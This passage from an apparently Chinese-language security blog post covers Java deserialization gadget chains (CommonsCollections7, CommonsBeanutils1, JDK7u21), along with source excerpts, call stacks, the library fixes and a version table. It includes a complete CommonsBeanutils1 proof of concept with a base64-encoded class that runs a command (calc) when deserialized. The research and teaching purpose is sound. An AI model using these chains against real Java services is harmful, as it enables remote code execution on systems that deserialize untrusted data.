class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">equals:472, AbstractMap (java.util)</span><br><span class="line">equals:130, AbstractMapDecorator (org.apache.commons.collections.map)</span><br><span class="line">reconstitutionPut:1221, Hashtable (java.util)</span><br><span class="line">readObject:1195, Hashtable (java.util)</span><br><span class="line">...</span><br><span class="line">main:49, CommonsCollections7 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>Hashtable#put</code> 也会调用 <code>entry.key.equals</code> 方法导致利用链被触发一次，因此需要将调用 <code>LazyMap#get</code> 时加入的 <code>key</code> 去掉。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>Hashtable#put</code> 调用的 <code>entry.key.equals</code> 需要返回 <code>false</code> 才能把第二个键值对放入 <code>Hashtable</code>。在 <code>AbstraceMap#equals</code> 中，如果 <code>value</code> 为 <code>null</code> 的话只需要让 <code>m.get(key)</code> 返回不为 <code>null</code> 即可。而 <code>transformer</code> 方法返回不为 <code>null</code> 很容易满足。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h2><p>Apache Commons Collections 官方在 2015 年底得知序列化相关的问题后，就在两个分支上同时发布了新的版本 4.1 和 3.2.2。</p>
<p>3.2.2 版代码中增加了一个方法 <code>FunctorUtils#checkUnsafeSerialization</code>，用于检测反序列化是否安全。如果开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会抛出异常。</p>
<p>这个检查在常见的危险 <code>Transformer</code> 类（<code>InstantiateTransformer</code>、<code>InvokerTransformer</code>、<code>PrototypeFactory</code>、<code>CloneTransformer</code> 等）的 <code>readObject</code> 里进行调用。所以，当我们反序列化包含这些对象时就会抛出一个异常：</p>
<p><code>Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property &#39;org.apache.commons.collections.enableUnsafeSerialization&#39; to &#39;true&#39;, but you must ensure that your application does not de-serialize objects from untrusted sources.</code></p>
<p>在 4.1 版本，这几个危险 <code>Transformer</code> 类不再实现 <code>Serializable</code> 接口，也就是说，他们几个彻底无法序列化和反序列化了。</p>
<table>
<thead>
<tr>
<th align="left">CommonsCollections Gadget Chains</th>
<th align="left">CommonsCollection Version</th>
<th align="left">JDK Version</th>
<th align="left">Note</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CommonsCollections1</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections2</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections3</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections4</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections5</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.8 8u76（实测8u181也可）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections6</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections7</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h1><h2 id="CommonsBeanutils-概述"><a href="#CommonsBeanutils-概述" class="headerlink" title="CommonsBeanutils 概述"></a>CommonsBeanutils 概述</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为 JavaBean）的一些操作方法。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty，让使用者可以直接调用任意 JavaBean 的 getter 方法。例如下面这段代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">        PropertyUtils.setProperty(bean, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(bean, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在执行 <code>PropertyUtils.getProperty(bean, &quot;name&quot;)</code> 时，commons-beanutils 会自动找到 <code>name</code> 属性的 getter 方法，也就是 getName，然后调用，获得返回值。</p>
<p>除此之外， <code>PropertyUtils.getProperty</code> 还支持递归获取属性，比如 <code>a</code> 对象中有属性 <code>b</code>，<code>b</code> 对象中有属性 <code>c</code>，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取。</p>
<p>通过这个方法，使用者可以很方便地调用任意对象的 getter，适用于在不确定 JavaBean 是哪个类对象时使用。</p>
<p>当然，commons-beanutils 中诸如此类的辅助方法还有很多，如调用 setter、拷贝属性等，这里不再细说。</p>
<h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><p>commons-beanutils 的 <code>org.apache.commons.beanutils.BeanComparator</code> 实现了 <code>java.util</code> 接口，它的 <code>compare</code> 方法会对待比较对象调用 <code>PropertyUtils.getProperty</code> 方法获取 <code>property</code> 属性。而 <code>TemplatesImpl#getOutputProperties</code> 可以触发字节码加载。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> comparator.compare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们可以借鉴 CC2 的思路在 <code>PriorityQueue</code> 中放两个 <code>TemplatesImpl</code> 并且设置 <code>BeanComparator</code> 为 <code>PriorityQueue</code> 的比较方式。此时如果我们设置 <code>BeanComparator</code> 的 <code>property</code> 属性为 <code>outputProperties</code> 则在反序列化触发 <code>BeanComparator#compare</code> 时会通过 <code>PropertyUtils.getProperty</code> 调用到 <code>TemplatesImpl#getOutputProperties</code> 进而实现任意字节码加载。</p>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">getProperty:426, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:157, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:38, CommonsBeanutils1 (com.example)</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意 <code>BeanComparator</code> 的构造方法有两个，如果没有指定 <code>Comparator</code> 默认会使用 <code>org.apache.commons.collections.comparators.ComparableComparator</code>。这样改利用链会依赖于 commons-collections 库。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">    setProperty( property );</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>为了避免这种依赖关系从而提高利用链的通用性，我们需要找到一个类来替换 <code>ComparableComparator</code>，它需要满足下面这几个条件：</p>
<ul>
<li>实现 <code>java.util.Comparator</code> 接口</li>
<li>实现 <code>java.io.Serializable</code> 接口</li>
<li>Java、shiro 或 commons-beanutils 自带，且兼容性强。</li>
</ul>
<p>实际上有很多类都满足这个条件，这里我选择的是 <code>CaseInsensitiveComparator</code>，可以通过 <code>String.CASE_INSENSITIVE_ORDER</code>  获取。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/java-serialization/images/105e5cae598e4a888081c4dcf0b3919e.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="原生反序列化利用链"><a href="#原生反序列化利用链" class="headerlink" title="原生反序列化利用链"></a>原生反序列化利用链</h1><p>主要是一些不依赖第三方库的 Java 反序列化利用链。</p>
<h2 id="JDK7u21"><a href="#JDK7u21" class="headerlink" title="JDK7u21"></a>JDK7u21</h2><p><code>AnnotationInvocationHandler</code> 类中的 <code>equalsImpl</code> 方法在参数 <code>Object o</code> 不是 <code>AnnotationInvocationHandler</code> 的实现类代理的对象时会获取 <code>AnnotationInvocationHandler#type</code> 中的所有方法，然后依次调用 <code>o</code> 中的这些方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AnnotationInvocationHandler <span class="title function_">asOneOfUs</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Proxy.isProxyClass(o.getClass())) &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Proxy.getInvocationHandler(o);</span><br><span class="line">        <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> AnnotationInvocationHandler)</span><br><span class="line">            <span class="keyword">return</span> (AnnotationInvocationHandler) handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        memberMethods = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    <span class="keyword">final</span> Method[] mm = type.getDeclaredMethods();</span><br><span class="line">                    validateAnnotationMethods(mm);</span><br><span class="line">                    AccessibleObject.setAccessible(mm, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> mm;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memberMethods;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> memberMethod.getName();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ourValue</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">hisValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">AnnotationInvocationHandler</span> <span class="variable">hisHandler</span> <span class="operator">=</span> asOneOfUs(o);</span><br><span class="line">        <span class="keyword">if</span> (hisHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                hisValue = memberMethod.invoke(o); <span class="comment">// 调用 o 的所有方法</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们不难想到如果构造一个 <code>AnnotationInvocationHandler</code> 使得其 <code>type</code> 为 <code>Templates.class</code> 然后将 <code>TemplatesImpl</code> 对象传入便会调用它的 <code>getOutputProperties</code> 方法实现恶意字节码加载。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

